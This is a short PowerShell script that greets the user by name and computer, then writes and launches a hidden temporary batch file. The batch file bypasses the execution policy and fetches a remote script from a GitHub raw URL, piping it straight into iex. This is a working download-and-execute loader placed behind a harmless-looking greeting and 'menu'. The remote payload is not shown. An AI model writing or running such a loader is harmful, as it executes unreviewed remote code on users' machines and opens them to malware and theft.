# Show greeting in PowerShell
$user = [System.Environment]::UserName
$hostName = $env:COMPUTERNAME
Write-Host "`n========= Welcome, $user! Computer: $hostName =========`n"

# Create and start batch file for menu in a new CMD window
$tmpBat = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
$batContent = @'
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/ranusTeam41/kinovrise/refs/heads/main/obsmcKinovRise_Version6.ps1 | iex"
pause
'@
Set-Content -Encoding ASCII $tmpBat $batContent
Start-Process cmd.exe -ArgumentList "/c `"$tmpBat`""
